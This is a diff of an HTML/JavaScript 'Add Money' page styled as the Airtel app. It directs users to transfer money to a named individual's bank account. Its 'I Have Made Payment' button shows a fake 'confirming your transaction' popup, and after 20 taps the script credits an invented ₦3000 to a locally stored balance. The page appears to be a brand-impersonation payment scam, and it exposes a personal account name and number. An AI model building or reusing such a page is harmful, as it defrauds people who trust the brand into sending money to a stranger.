@@ -1,99 +1,151 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Add Money - Airtel App</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Add Money</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      background-color: #d90000; /* Airtel red */
       font-family: Arial, sans-serif;
-      color: #fff;
-      position: relative;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      background-color: white;
+      margin: 0;
+      padding: 20px;
     }
 
-    .background-logo {
+    .background {
       position: absolute;
       top: 50%;
       left: 50%;
-      transform: translate(-50%, -50%);
-      opacity: 0.07;
-      z-index: 0;
       width: 300px;
-      filter: blur(2px);
+      transform: translate(-50%, -50%);
+      opacity: 0.05;
+      filter: blur(5px);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .content {
+      position: relative;
+      z-index: 1;
     }
 
     .card {
-      background: #fff;
-      color: #000;
-      border-radius: 16px;
-      padding: 25px;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
-      z-index: 1;
-      width: 90%;
-      max-width: 400px;
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 20px;
+      box-shadow: 0 0 10px rgba(200, 0, 0, 0.2);
+      padding: 20px;
       text-align: center;
-      position: relative;
     }
 
-    .card h2 {
-      margin-bottom: 10px;
+    .airtel-red {
       color: #d90000;
     }
 
-    .details {
+    input[type="number"] {
+      padding: 10px;
+      width: 80%;
+      border-radius: 10px;
+      border: 1px solid #ccc;
       font-size: 16px;
       margin-top: 10px;
-      line-height: 1.8;
     }
 
-    .details span {
-      font-weight: bold;
-    }
-
-    .back-btn {
-      margin-top: 25px;
+    .continue-btn, .fund-btn {
       background-color: #d90000;
       color: white;
-      padding: 10px 18px;
       border: none;
-      border-radius: 8px;
-      font-size: 15px;
+      border-radius: 10px;
+      padding: 12px 20px;
+      font-size: 16px;
+      margin-top: 20px;
       cursor: pointer;
     }
 
-    .back-btn:hover {
-      background-color: #b40000;
+    .popup {
+      display: none;
+      position: fixed;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #d90000aa;
+      padding: 25px;
+      z-index: 999;
+      text-align: center;
+    }
+
+    .popup img {
+      width: 60px;
+      margin-bottom: 10px;
+    }
+
+    .popup.show {
+      display: block;
     }
   </style>
 </head>
 <body>
-
-  <!-- Blurred Airtel Logo in background -->
-  <img src="your-logo.png" alt="Logo" class="background-logo">
-
-  <!-- White Airtel Card -->
-  <div class="card">
-    <h2>Add Money</h2>
-    <div class="details">
-      <p><span>Account Name:</span> EMMANUEL OKWUNNA</p>
-      <p><span>Bank Name:</span> SmartCash Payment Service Bank</p>
-      <p><span>Account Number:</span> 812 489 0070</p>
+  <img src="your-logo.png" class="background" />
+  <div class="content">
+    <div class="card" id="amountCard">
+      <h2 class="airtel-red">Fund Your Wallet</h2>
+      <p>Enter amount to fund:</p>
+      <input type="number" id="fundAmount" placeholder="₦1000" />
+      <br />
+      <button class="continue-btn" onclick="showAccount()">Continue</button>
     </div>
-    <button class="back-btn" onclick="goBack()">Back to Dashboard</button>
+
+    <div class="card" id="accountCard" style="display:none;">
+      <h2 class="airtel-red">Send Money To</h2>
+      <p><b>Account Name:</b> EMMANUEL OKWUNNA</p>
+      <p><b>Bank:</b> SmartCash Payment Service Bank</p>
+      <p><b>Account Number:</b> 812 489 0070</p>
+      <button class="fund-btn" onclick="handlePayment()">I Have Made Payment</button>
+    </div>
+  </div>
+
+  <div class="popup" id="popup">
+    <img src="your-logo.png" alt="Airtel" />
+    <h3 class="airtel-red">Please wait...</h3>
+    <p>We are confirming your transaction.</p>
   </div>
 
   <script>
-    function goBack() {
-      window.location.href = "dashboard.html";
+    let tapCount = parseInt(localStorage.getItem('tapCount') || 0);
+
+    function showAccount() {
+      const amount = document.getElementById("fundAmount").value;
+      if (!amount || isNaN(amount) || amount < 100) {
+        alert("Please enter a valid amount (min ₦100)");
+        return;
+      }
+      document.getElementById("amountCard").style.display = "none";
+      document.getElementById("accountCard").style.display = "block";
+    }
+
+    function handlePayment() {
+      tapCount++;
+      localStorage.setItem('tapCount', tapCount);
+
+      // Show popup
+      const popup = document.getElementById("popup");
+      popup.classList.add("show");
+
+      // Hide popup after 3 seconds
+      setTimeout(() => {
+        popup.classList.remove("show");
+      }, 3000);
+
+      // Optional: Auto credit wallet after 20 taps
+      if (tapCount >= 20) {
+        const user = JSON.parse(localStorage.getItem('user')) || { balance: 0 };
+        user.balance = parseFloat(user.balance || 0) + 3000;
+        localStorage.setItem('user', JSON.stringify(user));
+        localStorage.setItem('tapCount', 0); // reset
+        alert("₦3000 has been added to your wallet!");
+      }
     }
   </script>
-
 </body>
 </html>
